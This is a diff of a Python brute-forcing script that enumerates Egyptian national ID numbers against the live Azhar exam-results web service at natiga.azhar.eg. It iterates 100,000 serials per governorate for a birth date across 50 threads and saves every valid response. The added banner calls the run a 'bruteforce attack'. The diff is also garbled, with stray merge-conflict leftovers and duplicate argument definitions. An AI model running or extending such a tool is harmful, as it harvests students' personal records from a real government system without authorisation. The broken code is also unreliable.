@@ -11,8 +11,11 @@ import argparse
 import signal
 import sys
 import os
+main
 from tqdm import tqdm
 from threading import Lock
+from datetime import datetime
+main
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -32,6 +35,7 @@ url = "https://natiga.azhar.eg/WebService1.asmx/GetNatiga2nd"
 
 proxy = {
     "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080"
 }
 
 headers = {
@@ -165,6 +169,7 @@ def ValidateDateOfBirth(value):
         )
     return ivalue
 
+main
 def ValidateYear(value):
     ivalue = int(value)
     if ivalue < 1950 or ivalue > 2030:
@@ -223,6 +228,40 @@ def generate_dates_for_month(year, month):
     
     return dates
 
+def ValidateGovId(value):
+    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
+    if value not in all_gov_ids:
+        raise argparse.ArgumentTypeError(
+            f"Gov ID (-g) must be one of: {', '.join(all_gov_ids)}"
+        )
+    return value
+
+def display_startup_info(gov_ids, date_of_birth, threads, output_file, total_requests):
+    print("=" * 60)
+    print("          AZ SCRAPER - AZHAR ID BRUTEFORCER")
+    print("=" * 60)
+    print(f"[*] Target Service: AZHAR Education Portal")
+    print(f"[*] Company/Service URL: https://natiga.azhar.eg/")
+    print(f"[*] API Endpoint: WebService1.asmx/GetNatiga2nd")
+    print(f"[*] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("-" * 60)
+    print("CONFIGURATION:")
+    print(f"[*] Date of Birth (YMMDD): {date_of_birth}")
+    print(f"[*] Gov IDs to scan: {', '.join(gov_ids)}")
+    print(f"[*] Number of Gov IDs: {len(gov_ids)}")
+    print(f"[*] Threads: {threads}")
+    print(f"[*] Output File: {output_file}")
+    print(f"[*] Total Requests to send: {total_requests:,}")
+    print(f"[*] Requests per Gov ID: {total_requests // len(gov_ids):,}")
+    print("-" * 60)
+    print("PROXY CONFIGURATION:")
+    print(f"[*] HTTP Proxy: {proxy.get('http', 'None')}")
+    print(f"[*] HTTPS Proxy: {proxy.get('https', 'None')}")
+    print("=" * 60)
+    print("[+] Starting bruteforce attack...")
+    print("=" * 60)
+main
+
 def signal_handler(sig, frame):
     global progress_bar, stats, stop_event
     
@@ -256,6 +295,7 @@ def signal_handler(sig, frame):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SCRIPT TO BRUTEFORCE EG-ID IN AZHAR.")
+main
     
     # Date input arguments (either exact date OR year+month)
     parser.add_argument('-dob', type=ValidateDateOfBirth, help='Full date of Birth YMMDD like 70304 (-dob 70304)')
@@ -264,6 +304,10 @@ if __name__ == "__main__":
     
     parser.add_argument('-g', '--gov', type=ValidateGovId, nargs='+', 
                        help='Specific governorate ID(s) to test (e.g., -g 01 12 for Cairo and Dakahlia). If not specified, all governorates will be tested.')
+=======
+    parser.add_argument('-dob', type=ValidateDateOfBirth, required=True, default='60101', help='date of Birth YMMDD like 20304 (-dob 20304)')
+    parser.add_argument('-g', '--govid', type=ValidateGovId, help='Specific Gov ID to bruteforce (e.g., -g 12). If not specified, all gov IDs will be used.')
+main
     parser.add_argument('-o', '--file', type=str, default='valid_responses.json', help='Output to save results.')
     parser.add_argument('-t', '--threads', type=int, default='50', help='Threads.')
     args = parser.parse_args()
@@ -291,6 +335,20 @@ if __name__ == "__main__":
     
     output_file = args.file
     
+    # Determine which gov_ids to use
+    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
+    
+    if args.govid:
+        gov_ids = [args.govid]
+    else:
+        gov_ids = all_gov_ids
+    
+    # Calculate total requests
+    total_requests = len(gov_ids) * 100000
+    
+    # Display startup information
+    display_startup_info(gov_ids, base_value, args.threads, output_file, total_requests)
+    
     queue = Queue()
     lock = threading.Lock()
     stop_event = threading.Event()
@@ -308,6 +366,7 @@ if __name__ == "__main__":
     if hasattr(signal, 'SIGTERM'):
         signal.signal(signal.SIGTERM, signal_handler)  # Termination signal
     
+main
     print(f"[*] Press Ctrl+C to stop gracefully at any time")
     print(f"[*] All results will be saved before shutdown")
     print()
@@ -319,6 +378,12 @@ if __name__ == "__main__":
     else:
         gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
         print(f"[*] Using all {len(gov_ids)} governorates (use -g to specify specific ones)")
+=======
+    for prefix in gov_ids:
+        for i in range(100000):
+            bruted_value = f'{prefix}{i:05}'
+            queue.put(bruted_value)
+main
 
     print(f"[*] Starting brute force with {num_threads} threads...")
     print(f"[*] Testing {len(base_values)} date(s) across {len(gov_ids)} governorate(s)")
